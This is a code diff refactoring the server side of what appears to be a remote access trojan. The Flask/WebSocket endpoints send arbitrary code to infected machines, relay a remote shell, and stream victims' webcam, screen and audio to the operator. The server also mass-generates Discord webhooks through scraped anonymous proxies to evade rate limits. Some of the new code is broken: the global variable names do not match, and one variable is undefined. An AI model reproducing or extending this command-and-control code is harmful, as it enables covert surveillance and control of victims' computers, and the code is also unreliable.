@@ -13,11 +13,14 @@ while True:
 app = Flask(__name__)
 sock = Sock(app)
 command = {}
+
 shell_commands = {}
 shell_response = {}
+
 proxies = requests.get(
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&anonymity=elite&simplified=true"
 ).text.splitlines()
+
 proxies = ["socks5://" + proxy for proxy in proxies]
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 key = os.environ["key"]
@@ -65,20 +68,20 @@ def clear(webhooks):
         while True:
             try:
                 proxy = random.choice(proxies)
-                create(channel_id, proxy, timeout=60)
+                create_webhook(channel_id, proxy, timeout=60)
                 break
             except:
                 pass
 
 
-def log(webhook, ip):
+def log_webhook_creation(webhook, ip):
     requests.post(
         os.environ["webhook_generation_logs"],
         data={"content": f"{ip} has generated a new webhook {webhook}"},
     )
 
 
-def create(channel, proxy, timeout=10):
+def create_webhook(channel, proxy, timeout=10):
     if proxy:
         response = requests.post(
             f"https://discord.com/api/v9/channels/{channel}/webhooks",
@@ -102,7 +105,7 @@ def create(channel, proxy, timeout=10):
     return response
 
 
-def view(channel, proxy):
+def get_webhooks(channel, proxy):
     try:
         return requests.get(
             f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers
@@ -111,12 +114,12 @@ def view(channel, proxy):
         return None
 
 
-def genWebhook():
+def get_webhook():
     response = {"code": 30007}
     while True:
         try:
             proxy = random.choice(proxies)
-            response = create(channel_id, proxy)
+            response = create_webhook(channel_id, proxy)
             break
         except Exception as e:
             print(e)
@@ -129,7 +132,7 @@ def genWebhook():
 
     if "code" in list(response):
         if response["code"] == 30007:
-            webhooks = view(channel, proxy)
+            webhooks = get_webhooks(channel, proxy)
             webhook = random.choice(webhooks)
             threading.Thread(target=clear, args=(webhooks,)).start()
             return (
@@ -139,16 +142,16 @@ def genWebhook():
         elif response["code"] == 20029:
             print("Ratelimited. Attempting to use old webhook")
             try:
-                webhooks = view(channel_id2, proxy)
+                webhooks = get_webhooks(channel_id2, proxy)
                 webhook = random.choice(webhooks)
                 return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
             except:
 
                 print("No already existing webhooks, switching to seperate server")
-                webhooks = view(channel_id2, proxy)
+                webhooks = get_webhooks(channel_id2, proxy)
 
                 ratelimit = response["retry_after"]
-                response = create(channel_id2, proxy)
+                response = create_webhook(channel_id2, proxy)
                 ratelimit = min(ratelimit, response["retry_after"])
 
                 if not "id" in list(response):
@@ -202,112 +205,131 @@ def ping(ws, computer):
 def commands(ws):
     global connectedComputers
     global command
+
     print("User Connected")
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+    
     if not encoded == key:
         print("Client provided invalid key")
         ws.close()
+
     while True:
         computer = ws.receive()
         if not "|" in computer:
             ws.send("getComputer")
         else:
             break
+
     print(computer)
     connectedComputers.append(computer)
     threading.Thread(target=ping, args=(ws, computer)).start()
+
     while True:
-        c = dict(command)
-        if not c:
+
+        if not command:
             continue
-        print(c)
-        if computer == c["target"]:
+
+        if computer == command["target"]:
             if not computer in connectedComputers:
                 connectedComputers.append(computer)
 
-            ws.send(c["code"])
+            ws.send(command["code"])
             command = {}
 
 
 @sock.route("/api/ws/camera")
 def wscamera(ws):
-    global cameraImages
+    global camera_recv_ws
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+
     if not encoded == key:
-        print(0)
         ws.close()
-    try:
-        cameraImages
-    except:
-        cameraImages = {}
+
     computer = ws.receive()
-    print(computer)
     while True:
         image = ws.receive()
-        cameraImages[computer] = image
+        for ws in camera_rcv_ws[computer]:
+            try:
+                ws.send(image)
+            except:
+                camera_rcv_ws[computer].remove(ws)
 
 
 @sock.route("/api/ws/screen")
 def wsscreen(ws):
-    global screenImages
-    print("Streaming Desktop")
+    global screen_recv_ws
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+
     if not encoded == key:
-        print(1)
         ws.close()
-    try:
-        screenImages
-    except:
-        screenImages = {}
+
     computer = ws.receive()
     while True:
         image = ws.receive()
-        screenImages[computer] = image
+        for ws in screen_rcv_ws[computer]:
+            try:
+                ws.send(image)
+            except:
+                screen_rcv_ws[computer].remove(ws)
 
 
 @sock.route("/api/ws/audio")
 def wsaudio(ws):
-    global computerAudio
-    print("Streaming Audio")
+    global audio_recv_ws
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
+
     if not encoded == key:
-        print(1)
         ws.close()
-    try:
-        computerAudio
-    except:
-        computerAudio = {}
+        
     computer = ws.receive()
     while True:
         image = ws.receive()
-        computerAudio[computer] = image
+        for ws in audio_rcv_ws[computer]:
+            try:
+                ws.send(image)
+            except:
+                audio_rcv_ws[computer].remove(ws)
 
+@sock.route("/api/ws/showCamera")
+def camera(ws):
+    global camera_recv_ws
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
 
-@app.route("/sendCommand", methods=["GET", "POST"])
-def sendCommand():
-    global command
-    global target
-    try:
-        request.form["key"]
-    except:
-        return "", 404
-    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
     if not encoded == key:
-        return "", 404
-    if request.method == "POST":
-        command = request.form["Code"]
-        target = request.form["Target"]
-        return "", 204
+        ws.close()
+
+    computer = ws.receive()
+    camera_recv_ws[computer].append(ws)
+        
+@sock.route("/api/ws/showScreen")
+def screen(ws):
+    global screen_recv_ws
+    data = ws.receive()
+
+    encoded = hashlib.sha256(data.encode()).hexdigest()
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+    screen_recv_ws[computer].append(ws)
 
 
-@app.route("/ad", methods=["GET"])
-def ads():
-    return requests.get("https://ads.bloxrewards.repl.co").text
+@sock.route("/api/ws/playAudio")
+def audio(ws):
+    global audio_recv_ws
+    data = ws.receive()
+    encoded = hashlib.sha256(data.encode()).hexdigest()
 
+    if not encoded == key:
+        ws.close()
+
+    computer = ws.receive()
+    audio_recv_ws[computer].append(ws)
 
 def update(ws):
     global connectedComputers
@@ -402,76 +424,6 @@ def shell(ws):
         shell_response[computer] = ws.receive()
 
 
-@sock.route("/api/ws/showCamera")
-def camera(ws):
-    global cameraImages
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    if not encoded == key:
-        ws.close()
-    try:
-        cameraImages
-    except:
-        cameraImages = {}
-    try:
-        oldImage
-    except:
-        oldImage = None
-    computer = ws.receive()
-    while True:
-        if not computer in cameraImages:
-            continue
-
-        image = str(cameraImages[computer])
-        if not oldImage == image:
-            print(3)
-            ws.send(image)
-            oldImage = str(image)
-
-
-@sock.route("/api/ws/showScreen")
-def screen(ws):
-    global screenImages
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    if not encoded == key:
-        ws.close()
-    computer = ws.receive()
-    try:
-        screenImages
-    except:
-        screenImages = {}
-
-    while True:
-        if not computer in screenImages:
-            continue
-
-        ws.send(screenImages[computer])
-        time.sleep(1)
-
-
-@sock.route("/api/ws/playAudio")
-def audio(ws):
-    global computerAudio
-    data = ws.receive()
-    encoded = hashlib.sha256(data.encode()).hexdigest()
-    if not encoded == key:
-        ws.close()
-    computer = ws.receive()
-    try:
-        computerAudio
-    except:
-        computerAudio = {}
-
-    while True:
-        if not computer in computerAudio:
-            continue
-        if not computerAudio[computer]:
-            continue
-        ws.send(computerAudio[computer])
-        computerAudio[computer] = None
-
-
 @app.route("/webhook", methods=["POST", "GET"])
 def webhook():
     try:
@@ -499,12 +451,12 @@ def webhook():
         ip = request.environ["HTTP_X_FORWARDED_FOR"]
 
     try:
-        hook = genWebhook()
-        log(hook, ip)
+        webhook = get_webhook()
+        log_webhook_creation(hook, ip)
     except:
         hook = os.environ["backup_webhook"]
 
-    return hook
+    return webhook
 
 
 @app.route("/logs", methods=["POST", "GET"])
@@ -608,5 +560,5 @@ def notallowed(e):
 
 if __name__ == "__main__":
     # Run the Flask app
-    multiprocessing.Process(target=proxyswap).start()
+    threading.Thread(target=proxyswap).start()
     app.run(host="0.0.0.0", debug=True, port=8080)
